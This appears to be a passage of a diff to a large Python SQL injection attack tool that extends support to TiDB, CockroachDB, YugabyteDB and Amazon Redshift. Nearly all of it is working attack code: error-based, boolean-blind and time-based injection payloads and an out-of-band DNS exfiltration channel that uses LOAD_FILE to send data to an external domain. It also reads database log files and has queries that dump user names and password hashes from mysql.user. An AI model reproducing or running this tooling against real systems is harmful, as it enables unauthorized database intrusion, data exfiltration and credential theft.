+            _grpc_list = [_grpc_dbms] if _grpc_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
             # FIX-R1/R2: _get_cascade_payloads gives ALL 10 CERTIFIED_PAYLOAD_DATABASE categories.
             # FIX-R6: mutate_all() applies all 20 mutation layers.
             # FIX-R9: asyncio.sleep(0) yields event loop between iterations.
@@ -90206,7 +91105,7 @@ class GraphQLSubscriptionInjector:
 
                 # Test each variable  BUG-2 FIX (Req 1): CERTIFIED_PAYLOAD_DATABASE only
                 _gqls_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-                _gqls_list = [_gqls_dbms] if _gqls_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+                _gqls_list = [_gqls_dbms] if _gqls_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
                 # FIX-R1/R2: _get_cascade_payloads gives ALL 10 CERTIFIED_PAYLOAD_DATABASE categories.
                 # FIX-R6: mutate_all() applies all 20 mutation layers.
                 # FIX-R9: asyncio.sleep(0) yields event loop between iterations.
@@ -91621,7 +92520,9 @@ class GroupConcatExtractor:
         elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             wrapped = _chr_wrap(
                 f"SELECT string_agg(t::text,'') FROM ({sql_query}) AS t(t)", dbms)
-        elif dbms in ("MySQL", "MariaDB", ""):
+        elif dbms in ("MySQL", "MariaDB", "TiDB", ""):
+            # BUG-GCE-GROUPCONCAT-TIDB FIX: TiDB is MySQL-wire-compatible;
+            # GROUP_CONCAT() with SEPARATOR syntax is valid in TiDB.
             wrapped = _chr_wrap(
                 f"GROUP_CONCAT(({sql_query}) SEPARATOR '')", dbms)
         elif dbms in ("MSSQL", "Sybase"):
@@ -94081,7 +94982,7 @@ class ScannerV10(ScannerV9):
                 _spec_dbms = (getattr(cfg, 'forced_dbms', None) or
                               getattr(cfg, '_detected_dbms', None) or dbms_hint or 'MySQL')
                 _spec_dbms_list = ([_spec_dbms] if _spec_dbms != 'MySQL'
-                                   else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"])
+                                   else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"])
                 _spec_time_payloads = []
                 for _spec_d in _spec_dbms_list:
                     # BUG-R2-A FIX: use _get_cascade_payloads (all 10 categories merged,
@@ -94907,7 +95808,7 @@ class CachePoisonTimingDetector:
 
         # BUG-2 FIX (Req 1): use DBMS-specific Timebased payloads from CERTIFIED_PAYLOAD_DATABASE only
         _cpt_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-        _cpt_list = [_cpt_dbms] if _cpt_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _cpt_list = [_cpt_dbms] if _cpt_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         # FIX-R1/R2: _get_cascade_payloads merges ALL 10 CERTIFIED_PAYLOAD_DATABASE categories
         # (Timebased-first), not just a single Timebased category.
         # FIX-INDENT: the try: block was outside the inner for loop — it only ran ONCE after
@@ -97436,6 +98337,23 @@ class DBLogChannelExtractor:
             "/var/log/mysqld.log", "/tmp/mysql.log",
             "C:/ProgramData/MySQL",
         ],
+        "MariaDB": [
+            "/var/log/mysql/error.log", "/var/log/mariadb/mariadb.log",
+            "/var/log/mysqld.log", "/tmp/mariadb.log",
+        ],
+        # BUG-DBLOGCHAN-TIDB-PATHS FIX: TiDB was absent from LOG_PATHS. With an empty
+        # path list, DBLogChannelExtractor.read_log() immediately returned None for all
+        # TiDB targets, making the DBLogChannel extraction permanently non-functional
+        # even when write_to_log() successfully wrote a marker using EXTRACTVALUE().
+        # TiDB default log paths: --log-file flag defaults to /tmp/tidb.log in most
+        # deployments. Container and package installs vary; we list common variants.
+        # Note: read_log() uses LOAD_FILE() which requires FILE privilege (same as MySQL).
+        "TiDB": [
+            "/tmp/tidb.log",
+            "/var/log/tidb/tidb.log",
+            "/var/log/tidb.log",
+            "/data/tidb/log/tidb.log",
+        ],
         "MSSQL": [
             "C:/Program Files/Microsoft SQL Server",
         ],
@@ -97477,7 +98395,13 @@ class DBLogChannelExtractor:
         # numeric injection contexts work (empty prefix, no leading quote).
         _dlc_pfx = _derive_inj_prefix(self.result) if self.result else "'"
         probes: List[str] = []
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-DBLOGCHAN-TIDB-WRITE FIX: TiDB missing from MySQL/MariaDB branch in
+            # DBLogChannelExtractor.write_to_log(). TiDB is MySQL-wire-compatible:
+            # EXTRACTVALUE() and CAST(... AS SIGNED) are valid TiDB SQL. Without this fix,
+            # TiDB probes returns [] → write_to_log() skips all probes → returns False →
+            # exfiltrate() cannot write a marker to the log → read_log() has nothing to read
+            # → DBLogChannel extraction completely non-functional for TiDB targets.
             probes = [
                 f"{_dlc_pfx} AND EXTRACTVALUE(1,CONCAT('SQR_LOG_{marker}'))--",
                 f"{_dlc_pfx} AND 1=CAST('SQR_LOG_{marker}' AS SIGNED)--",
@@ -97567,7 +98491,8 @@ class DBLogChannelExtractor:
         _dlc_pfx = _derive_inj_prefix(self.result) if self.result else "'"
 
         # Write marker + query result to log
-        if dbms in ("MySQL","MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-DBLOGCHAN-EXFIL-TIDB FIX: TiDB supports EXTRACTVALUE() like MySQL.
             probe = (f"{_dlc_pfx} AND EXTRACTVALUE(1,CONCAT('SQR_{marker}_',"
                      f"({sql_query})))--")
         else:
@@ -98652,7 +99577,14 @@ class DoHOOBChannel:
         dom = self.oob_domain
         seq_prefix = f"{chunk_index:02x}"
         sql_start = 1 + offset  # SQL SUBSTR is 1-based
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-DOH-TIDB-BUILD FIX: TiDB was missing from MySQL/MariaDB branch in
+            # DoHOOBChannel.build_payload(). TiDB fell to the else branch which also
+            # produces MySQL-style LOAD_FILE payloads (same SQL) but without explicit
+            # intent — this works by accident, but being explicit is architecturally
+            # correct and future-proof against someone adding TiDB-specific else logic.
+            # TiDB is MySQL-wire-compatible: HEX(), SUBSTR(), CONCAT(), CHAR(), and
+            # LOAD_FILE() are all valid TiDB functions.
             hx = f"LOWER(HEX(SUBSTR(({sql_query}),{sql_start},{chunk_size})))"
             label_expr = f"CONCAT('{seq_prefix}',{hx})"
             return (f"' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),"
@@ -98792,14 +99724,19 @@ class DoHOOBChannel:
         # Fix: guard on config._oob_has_file_priv (set by OOBDetector.detect when the
         # detection payload confirmed FILE privilege was available). If unconfirmed, skip
         # extraction immediately with a clear warning rather than wasting all 8 chunk probes.
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-DOH-TIDB-FILEPRIV FIX: TiDB was missing from the FILE privilege guard.
+            # TiDB LOAD_FILE UNC payloads also require FILE privilege (same MySQL semantics).
+            # Without this guard, DoHOOBChannel.exfiltrate() for TiDB would send 8 chunk
+            # payloads and wait 10+ seconds for DNS hits that never arrive because LOAD_FILE
+            # returns NULL silently without FILE privilege. Extended the guard to cover TiDB.
             _cfg2 = getattr(self, "config", None)
             if not getattr(_cfg2, "_oob_has_file_priv", False):
-                LOG.warning("[DoHOOB] MySQL/MariaDB OOB extraction requires FILE privilege. "
+                LOG.warning("[DoHOOB] MySQL/MariaDB/TiDB OOB extraction requires FILE privilege. "
                             "FILE privilege was not confirmed during detection (LOAD_FILE never "
                             "successfully triggered DNS). Skipping OOB extraction to avoid "
                             "silent NULL returns. Use boolean-blind or timing extraction instead.")
-                print("[!] [DoHOOB] Skipping MySQL OOB: LOAD_FILE requires FILE privilege "
+                print("[!] [DoHOOB] Skipping MySQL/TiDB OOB: LOAD_FILE requires FILE privilege "
                       "(not confirmed by detection). Falling through to other extraction engines.",
                       flush=True)
                 return None
@@ -99189,11 +100126,19 @@ class GodelianPayloadGenerator:
         Returns (proven, confidence). proven=True is mathematically certain.
         """
         dbms_payloads_map = {
-            "MySQL":      ["MySQL"],
-            "MariaDB":    ["MySQL"],
-            "MSSQL":      ["MSSQL"],
-            "PostgreSQL": ["PostgreSQL"],
-            "Oracle":     ["Oracle"],
+            "MySQL":           ["MySQL"],
+            "MariaDB":         ["MySQL"],
+            # BUG-GDELIAN-TIDB-PGCOMPAT FIX: TiDB is MySQL-wire-compatible → MySQL payloads.
+            # CockroachDB/YugabyteDB/Amazon Redshift are PG-wire-compatible → PostgreSQL payloads.
+            # Without explicit entries all three fell to the default "MySQL" → generated MySQL
+            # EXTRACTVALUE/UPDATEXML payloads on PG-compat DBMSes → syntax error → proof fails.
+            "TiDB":            ["MySQL"],
+            "PostgreSQL":      ["PostgreSQL"],
+            "CockroachDB":     ["PostgreSQL"],
+            "YugabyteDB":      ["PostgreSQL"],
+            "Amazon Redshift": ["PostgreSQL"],
+            "MSSQL":           ["MSSQL"],
+            "Oracle":          ["Oracle"],
         }
         target_dbms = dbms_payloads_map.get(dbms, ["MySQL"])[0]
 
@@ -99285,6 +100230,26 @@ class MetamorphicPayloadEngine:
         # is an integer-returning FUNCTION valid in SQL expressions. Two variants for channel diversity.
         "Oracle":     ["DBMS_PIPE.RECEIVE_MESSAGE('sqrx_se_a',{t})",
                        "DBMS_PIPE.RECEIVE_MESSAGE('sqrx_se_b',{t})"],
+        # BUG-SLEEP-EQUIV-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() and BENCHMARK()
+        # are valid TiDB SQL functions. Prior to this fix, TiDB fell to MySQL via
+        # `self.SLEEP_EQUIV.get(dbms, self.SLEEP_EQUIV.get("MySQL", []))` which is correct
+        # by accident, but explicit entries prevent accidental breakage if fallback changes.
+        "TiDB":       ["SLEEP({t})", "BENCHMARK({big},SHA1(1))",
+                       "(SELECT*FROM(SELECT(SLEEP({t})))sqr_tidb_sleep)"],
+        # BUG-SLEEP-EQUIV-CRDB FIX: CockroachDB uses pg_sleep() (PostgreSQL-compatible).
+        # Prior fallback was MySQL SLEEP() which is invalid on CockroachDB — causes
+        # syntax error → time-based injection reports 0s delay → technique fails entirely.
+        "CockroachDB": ["pg_sleep({t})", "(SELECT 1 FROM pg_sleep({t}))"],
+        # BUG-SLEEP-EQUIV-YUGABYTE FIX: YugabyteDB uses pg_sleep() (PostgreSQL-compatible).
+        # Prior fallback was MySQL SLEEP() — same failure mode as CockroachDB above.
+        "YugabyteDB":  ["pg_sleep({t})", "(SELECT 1 FROM pg_sleep({t}))"],
+        # BUG-SLEEP-EQUIV-REDSHIFT FIX: Amazon Redshift uses pg_sleep() (PG-compatible).
+        # Prior fallback was MySQL SLEEP() — causes syntax error on Redshift.
+        "Amazon Redshift": ["pg_sleep({t})", "(SELECT 1 FROM pg_sleep({t}))"],
+        # MariaDB is MySQL-compatible (SLEEP/BENCHMARK both work)
+        "MariaDB":    ["SLEEP({t})", "BENCHMARK({big},SHA1(1))"],
+        "SQLite":     ["(SELECT LIKE('X',UPPER(HEX(RANDOMBLOB({big}*{big})))))",
+                       "(SELECT {t} FROM (SELECT 1) WHERE LIKE('X',UPPER(HEX(RANDOMBLOB({big})))))"],
     }
 
     WHITESPACE_VARIANTS = [
@@ -100459,7 +101424,8 @@ class ScannerV11(ScannerV10):
             pg_lo   = (PGLargeObjectExtractor(engine, cfg, result, scan_meth,
                                                scan_url, data, data_fmt,
                                                original, tamper_chain)
-                       if dbms == "PostgreSQL" else None)
+                       # BUG-PGLO-CRDB FIX: CockroachDB/YugabyteDB support PG large object protocol.
+                       if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB") else None)
             ms_fs   = (MSSQLFilestreamExtractor(engine, cfg, result, scan_meth,
                                                  scan_url, data, data_fmt,
                                                  original, tamper_chain)
@@ -100547,12 +101513,11 @@ class ScannerV11(ScannerV10):
                             # Numeric safety: COALESCE/CHAR_LENGTH return integers; {m} is always
                             # a plain integer literal in the comparison; no string delimiters touched.
                             _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>={m}"  # BUG-V11-LTPL-PG-MYSQL FIX
-                        elif _dbms11 in ("MySQL", "MariaDB"):
+                        elif _dbms11 in ("MySQL", "MariaDB", "TiDB"):
+                            # BUG-TECHNIQUE11-TIDB FIX: TiDB is MySQL-wire-compatible;
+                            # ORD(MID()) and CHAR_LENGTH() are valid TiDB functions.
                             _ctpl11 = "ORD(MID(({q}),{p},1))>={m}"
-                            # BUG-V11-LTPL-PG-MYSQL FIX (HIGH): same byte-vs-char issue as PG above.
-                            # MySQL LENGTH() returns bytes; CHAR_LENGTH() returns characters.
-                            # COALESCE guards NULL-returning subqueries.
-                            _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>={m}"  # BUG-V11-LTPL-PG-MYSQL FIX
+                            _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>={m}"
                         elif _dbms11 == "MSSQL":
                             _ctpl11 = "UNICODE(SUBSTRING(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-MSSQL-SYBASE FIX (HIGH): LEN() in SQL Server strips
@@ -103305,7 +104270,8 @@ class OrderByContextExtractor:
         # clause syntax for the boolean oracle channel. CASE WHEN works on all, but
         # placement and prefix depend on the injection context (ORDER BY clause vs
         # SELECT list vs WHERE subquery).
-        if dbms in ("MySQL","MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-ORDERBY-TIDB FIX: TiDB supports CASE WHEN in ORDER BY like MySQL.
             true_payload  = f"{original} CASE WHEN ({condition}) THEN 1 ELSE 2 END"
             false_payload = f"{original} CASE WHEN (1=0) THEN 1 ELSE 2 END"
         elif dbms == "MSSQL":
@@ -104112,9 +105078,12 @@ class ScannerV12(ScannerV11):
 
         # DBMS-specific extraction helpers
         def _err_payload(sql):
-            if dbms in ("MySQL","MariaDB"):
+            # BUG-AUTOEXTRACT-TIDB-ERRPAYLOAD FIX: TiDB added explicitly before the final
+            # return so the intent is documented. TiDB supports EXTRACTVALUE() identically
+            # to MySQL — no functional change, but implicit fallback was architecturally wrong.
+            if dbms in ("MySQL","MariaDB","TiDB"):
                 return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({sql}),0x7e))-- -"
-            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift"):
+            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift","YugabyteDB"):
                 return f"' AND CAST(({sql}) AS integer)-- -"
             elif dbms in ("MSSQL","Sybase"):
                 return f"' AND 1=CONVERT(int,({sql}))-- -"
@@ -104132,9 +105101,11 @@ class ScannerV12(ScannerV11):
             return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({sql}),0x7e))-- -"
 
         def _err_extract(body):
-            if dbms in ("MySQL","MariaDB"):
+            # BUG-AUTOEXTRACT-TIDB-ERREXTRACT FIX: TiDB added explicitly.
+            # TiDB EXTRACTVALUE() produces the same ~value~ pattern as MySQL.
+            if dbms in ("MySQL","MariaDB","TiDB"):
                 m = re.search(r"~([^~]{1,200})~", body)
-            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift"):
+            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift","YugabyteDB"):
                 m = re.search(r'invalid input syntax[^:]+:\s*"?([^"\n<]{1,200})"?', body, re.I)
             elif dbms in ("MSSQL","Sybase"):
                 m = re.search(r"Conversion failed[^']*\'([^\']{1,200})\'", body, re.I)
@@ -104162,10 +105133,13 @@ class ScannerV12(ScannerV11):
         _ascii_fn = "ASCII"
         if dbms == "Firebird":
             _ascii_fn = "ASCII_VAL"
-        if dbms in ("MySQL","MariaDB"): _cast_text="CAST(({q}) AS CHAR)"
+        # BUG-AUTOEXTRACT-TIDB-CAST FIX: TiDB is MySQL-wire-compatible — CAST(... AS CHAR) is
+        # correct. Without explicit TiDB branch, TiDB falls to VARCHAR(4000) else-path which
+        # works but is not idiomatic and can fail on some TiDB versions under strict SQL mode.
+        if dbms in ("MySQL","MariaDB","TiDB"): _cast_text="CAST(({q}) AS CHAR)"
         elif dbms=="MSSQL": _cast_text="CAST(({q}) AS NVARCHAR(MAX))"
         elif dbms=="Oracle": _cast_text="TO_CHAR(({q}))"
-        elif dbms in ("PostgreSQL","CockroachDB","SQLite"): _cast_text="CAST(({q}) AS TEXT)"
+        elif dbms in ("PostgreSQL","CockroachDB","SQLite","Amazon Redshift","YugabyteDB"): _cast_text="CAST(({q}) AS TEXT)"
         else: _cast_text="CAST(({q}) AS VARCHAR(4000))"
 
         # Baseline for boolean comparison
@@ -104319,16 +105293,20 @@ class ScannerV12(ScannerV11):
 
         # Current user
         user_sql = {
-            "MySQL":"SELECT user()", "MariaDB":"SELECT user()",
-            "PostgreSQL":"SELECT current_user", "MSSQL":"SELECT SYSTEM_USER",
+            "MySQL":"SELECT user()", "MariaDB":"SELECT user()", "TiDB":"SELECT user()",
+            "PostgreSQL":"SELECT current_user", "CockroachDB":"SELECT current_user",
+            "YugabyteDB":"SELECT current_user", "Amazon Redshift":"SELECT current_user",
+            "MSSQL":"SELECT SYSTEM_USER",
             "Oracle":"SELECT USER FROM dual", "SQLite":"SELECT 'N/A'",
-        }.get(dbms, "SELECT user()")
+        }.get(dbms, "SELECT user()")  # BUG-UNIONINFO-USER-TIDB FIX: TiDB/CRDB/YG/Redshift added
         await _extract("User", user_sql)
 
         # Current database
         db_sql = {
-            "MySQL":"SELECT database()", "MariaDB":"SELECT database()",
-            "PostgreSQL":"SELECT current_database()", "MSSQL":"SELECT DB_NAME()",
+            "MySQL":"SELECT database()", "MariaDB":"SELECT database()", "TiDB":"SELECT database()",
+            "PostgreSQL":"SELECT current_database()", "CockroachDB":"SELECT current_database()",
+            "YugabyteDB":"SELECT current_database()", "Amazon Redshift":"SELECT current_database()",
+            "MSSQL":"SELECT DB_NAME()",
             # BUG-ORA-UNIONDB-FIX: ora_database_name is PL/SQL only → ORA-00904 in SQL.
             "Oracle":"SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL", "SQLite":"SELECT 'main'",
         }.get(dbms, "SELECT database()")
@@ -104338,7 +105316,21 @@ class ScannerV12(ScannerV11):
         dbs_sql = {
             "MySQL":      "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR ',') FROM information_schema.schemata",
             "MariaDB":    "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata",
+            # BUG-UNIONINFO-DBS-TIDB FIX: TiDB is MySQL-wire-compatible; GROUP_CONCAT with
+            # SEPARATOR keyword is valid TiDB SQL.
+            "TiDB":       "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR ',') FROM information_schema.schemata",
             "PostgreSQL": "SELECT STRING_AGG(nspname,',') FROM pg_namespace WHERE nspname NOT LIKE 'pg_%' AND nspname != 'information_schema'",
+            # BUG-UNIONINFO-DBS-CRDB FIX: CockroachDB is PG-wire-compatible; STRING_AGG works.
+            # Prior to this fix, CockroachDB fell to MySQL GROUP_CONCAT fallback → syntax error.
+            "CockroachDB": ("SELECT STRING_AGG(schema_name,',') FROM information_schema.schemata"
+                            " WHERE catalog_name=current_database()"),
+            # BUG-UNIONINFO-DBS-YUGABYTE FIX: YugabyteDB is PG-wire-compatible.
+            "YugabyteDB":  ("SELECT STRING_AGG(nspname,',') FROM pg_catalog.pg_namespace"
+                            " WHERE nspname NOT LIKE 'pg_%' AND nspname != 'information_schema'"),
+            # BUG-UNIONINFO-DBS-REDSHIFT FIX: Amazon Redshift supports LISTAGG (not STRING_AGG).
+            # information_schema.schemata is available on Redshift with standard PG filtering.
+            "Amazon Redshift": ("SELECT LISTAGG(DISTINCT schema_name,',') WITHIN GROUP (ORDER BY schema_name)"
+                                " FROM information_schema.schemata WHERE catalog_name=current_database()"),
             # FIX-REQ8-MSSQL-SYSDBS: STRING_AGG requires SQL Server 2017+.
             # STUFF/FOR XML PATH works from SQL Server 2005+.
             "MSSQL":      ("SELECT STUFF((SELECT ','+ name FROM master..sysdatabases "
@@ -104353,6 +105345,8 @@ class ScannerV12(ScannerV11):
             tbl_sql = {
                 "MySQL":      f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='{current_db}' LIMIT 20",
                 "MariaDB":    f"SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='{current_db}'",
+                # BUG-UNIONINFO-TBL-TIDB FIX: TiDB is MySQL-wire-compatible.
+                "TiDB":       f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='{current_db}' LIMIT 20",
                 # BUG-PG-SCHEMANAME-FIX (Req 7/8): Was `WHERE schemaname='{current_db}'` which is
                 # WRONG — schemaname is the SCHEMA name (e.g. 'public'), not the DATABASE name
                 # (e.g. 'myapp').  current_database() returns the database name, which never
@@ -104363,6 +105357,17 @@ class ScannerV12(ScannerV11):
                                " FROM pg_tables"
                                " WHERE schemaname NOT IN ('pg_catalog','information_schema','pg_toast')"
                                " LIMIT 30"),
+                # BUG-UNIONINFO-TBL-CRDB FIX: CockroachDB uses STRING_AGG (PG-compatible).
+                # Prior fallback was MySQL GROUP_CONCAT → syntax error on CockroachDB.
+                "CockroachDB": (f"SELECT STRING_AGG(table_name,',') FROM information_schema.tables"
+                                f" WHERE table_schema='{current_db}' AND table_type='BASE TABLE'"),
+                # BUG-UNIONINFO-TBL-YUGABYTE FIX: YugabyteDB uses STRING_AGG (PG-compatible).
+                "YugabyteDB":  (f"SELECT STRING_AGG(table_name,',') FROM information_schema.tables"
+                                f" WHERE table_schema='{current_db}' AND table_type='BASE TABLE'"),
+                # BUG-UNIONINFO-TBL-REDSHIFT FIX: Redshift uses LISTAGG (not STRING_AGG).
+                "Amazon Redshift": (f"SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)"
+                                    f" FROM information_schema.tables"
+                                    f" WHERE table_schema='{current_db}' AND table_type='BASE TABLE'"),
                 # BUG-MSSQL-STRINGAGG-TABLE-FIX (Req 7/8): STRING_AGG requires SQL Server 2017+.
                 # sysobjects is deprecated; use sys.tables (available SQL Server 2005+).
                 # Use STUFF/FOR XML PATH which is compatible with SQL Server 2005+.
@@ -105368,6 +106373,27 @@ SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
         r"unknown column .* in .field list",
         r"column count doesn.t match",
     ],
+    # BUG-SQLPAT-TIDB FIX: TiDB absent from SQL_ERROR_PATTERNS.
+    # SQL_ERROR_PATTERNS.get("TiDB", []) returned [] → fell to Generic patterns.
+    # Generic patterns miss MySQL-specific strings (extract_?value, xpath syntax error,
+    # column count doesn't match, etc.) that TiDB produces as a MySQL-wire-compatible DBMS.
+    # Root cause: detect_error's DBMS-specific pattern path returned [] for TiDB, causing
+    # error-based TiDB injections to be classified under Generic instead of per-DBMS patterns.
+    # Fix: add TiDB with the same pattern set as MySQL (TiDB uses MySQL parser/error format).
+    # TiDB also exposes its own version string "TiDB" in some error messages.
+    "TiDB": [
+        r"you have an error in your sql syntax",
+        r"tidb.*error",                  # TiDB-specific error strings
+        r"warning: mysqli_",
+        r"extract_?value\s*\(",
+        r"updatexml\s*\(",
+        r"xpath syntax error",
+        r"(\~|0x7e)[0-9a-f]{4,}",
+        r"unknown column .* in .field list",
+        r"column count doesn.t match",
+        r"division by zero",
+        r"truncated incorrect (?:integer|double|real)",
+    ],
     "PostgreSQL": [
         r"pg_query|pg_exec|pg_num_rows",
         r"postgresql.*error", r"psycopg2",
@@ -105443,6 +106469,52 @@ SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
         r"sqlite3\.databaseerror",
         r"sqlite3\.interfaceerror",
         r"unable to open database",
+    ],
+    # BUG-ERRPAT-PGCOMPAT FIX: CockroachDB, YugabyteDB, and Amazon Redshift are
+    # PG-wire-compatible; they produce PostgreSQL-style SQL error messages.
+    # Without explicit entries, detect_error() fell to "Generic" patterns which
+    # miss PG-specific strings — "operator does not exist", "invalid input syntax
+    # for type", "syntax error at or near", "relation .* does not exist" — that
+    # all three emit. This caused error-based injection signals on these DBMSes
+    # to be classified as Generic instead of DBMS-confirmed, weakening PCV-C
+    # confirmation accuracy and increasing false-negative rate for error-based
+    # technique detection on all three DBMS families.
+    "CockroachDB": [
+        r"operator does not exist",
+        r"syntax error at or near",
+        r"invalid input syntax for (?:type )?",
+        r"column .* does not exist",
+        r"relation .* does not exist",
+        r"ERROR:\s+division by zero",
+        r"ERROR:\s+function .* does not exist",
+        r"pq:.*error",                           # CockroachDB Go pq driver prefix
+        r"crdb.*error|cockroachdb.*error",        # CockroachDB-specific strings
+        r"ambiguous column reference",
+        r"ERROR:\s+could not parse",
+    ],
+    "YugabyteDB": [
+        r"operator does not exist",
+        r"syntax error at or near",
+        r"invalid input syntax for (?:type )?",
+        r"column .* does not exist",
+        r"relation .* does not exist",
+        r"ERROR:\s+division by zero",
+        r"ERROR:\s+function .* does not exist",
+        r"yb.*error|yugabyte.*error",            # YugabyteDB-specific prefix
+        r"pgsql.*error|error.*pgsql",
+        r"invalid byte sequence",
+    ],
+    "Amazon Redshift": [
+        r"operator does not exist",
+        r"syntax error at or near",
+        r"invalid input syntax for (?:type )?",
+        r"column .* does not exist",
+        r"relation .* does not exist",
+        r"ERROR:\s+division by zero",
+        r"ERROR:\s+function .* does not exist",
+        r"amazon.*redshift|redshift.*error",     # Redshift-specific string
+        r"serializable isolation violation",     # Redshift MVCC error string
+        r"pg_exception_context",                 # Redshift verbose error field
     ],
     "Generic": [
         r"sql syntax.*error", r"sql error",
@@ -106066,6 +107138,137 @@ def _populate_dbms_queries():
             "if_func": "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
             "privileges": "SELECT 'N/A'",
             # BUG-FIX-7C: explicit empty-string guard for SQLite string extraction
+            "null_to_empty": "COALESCE(({query}),'')",
+        },
+        # BUG-DBMSQ-TIDB-PGCOMPAT FIX: TiDB, CockroachDB, YugabyteDB, Amazon Redshift
+        # were absent from DBMS_QUERIES._templates.  _safe_dbms_queries() for any of
+        # these fell to MySQL (first in _FALLBACK_ORDER) — correct for TiDB but wrong
+        # for CockroachDB/YugabyteDB/Redshift which are PG-wire-compatible.
+        # CockroachDB/YugabyteDB/Redshift received MySQL templates:
+        #   GROUP_CONCAT / SEPARATOR       → syntax error (PG uses string_agg)
+        #   IF(cond,t,f)                   → error (PG uses CASE WHEN)
+        #   ORD(MID(q,pos,1))              → function does not exist (PG uses ASCII/SUBSTRING)
+        #   CHAR_LENGTH fallback was OK but was never reached
+        # All extraction engines (MultiStrategyExtractor, AdaptiveFrequencyExtractor,
+        # SchemaEnumeratorV18, BatchedCharExtractor, etc.) calling _safe_dbms_queries()
+        # then emitting those broken templates against PG-compat targets → SQL errors →
+        # oracle always returned None/False → binary search converged to 0 → every
+        # extracted character was '\x00' → all extraction output garbage on CRDB/YGB/RS.
+        # Fix: add explicit entries with correct DBMS-specific templates.
+        # TiDB: MySQL-wire-compatible; use MySQL-identical templates except version query.
+        "TiDB": {
+            "version":      "SELECT TIDB_VERSION()",
+            "current_db":   "SELECT DATABASE()",
+            "current_user": "SELECT CURRENT_USER()",
+            "hostname":     "SELECT @@hostname",
+            "dbs": ("SELECT GROUP_CONCAT(SCHEMA_NAME ORDER BY SCHEMA_NAME SEPARATOR ',')"
+                    " FROM information_schema.SCHEMATA"),
+            "tables": ("SELECT GROUP_CONCAT(TABLE_NAME ORDER BY TABLE_NAME SEPARATOR ',')"
+                       " FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()"),
+            "columns": ("SELECT GROUP_CONCAT(COLUMN_NAME ORDER BY ORDINAL_POSITION SEPARATOR ',')"
+                        " FROM information_schema.COLUMNS"
+                        " WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='{table}'"),
+            "count":        "SELECT COUNT(*) FROM `{db}`.`{table}`",
+            "row":          "SELECT CONCAT_WS(CHAR(124),{cols}) FROM `{db}`.`{table}` LIMIT 1 OFFSET {offset}",
+            "users":        "SELECT GROUP_CONCAT(User ORDER BY User SEPARATOR ',') FROM mysql.user",
+            "passwords":    "SELECT GROUP_CONCAT(authentication_string ORDER BY User SEPARATOR '|') FROM mysql.user",
+            # TiDB uses ORD(MID()) — MySQL-compatible; ORD handles code points > 127 correctly
+            "char_func":     "COALESCE(ORD(MID(({query}),{pos},1)),0)",
+            "char_func_hex": "HEX(MID(({query}),{pos},1))",
+            "substr":        "MID(({query}),{pos},1)",
+            "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
+            "if_func":       "IF(({cond}),{t},{f})",
+            "privileges":    "SELECT GROUP_CONCAT(DISTINCT PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.USER_PRIVILEGES",
+            "null_to_empty": "COALESCE(({query}),'')",
+        },
+        # CockroachDB: PG-wire-compatible; uses PG-standard SQL syntax with CRDB extensions.
+        "CockroachDB": {
+            "version":      "SELECT version()",
+            "current_db":   "SELECT current_database()",
+            "current_user": "SELECT current_user",
+            "hostname":     "SELECT 'N/A'",
+            "dbs": ("SELECT string_agg(datname,',' ORDER BY datname)"
+                    " FROM pg_database WHERE datistemplate=false AND datallowconn=true"),
+            "tables": ("SELECT string_agg(table_name,',' ORDER BY table_name)"
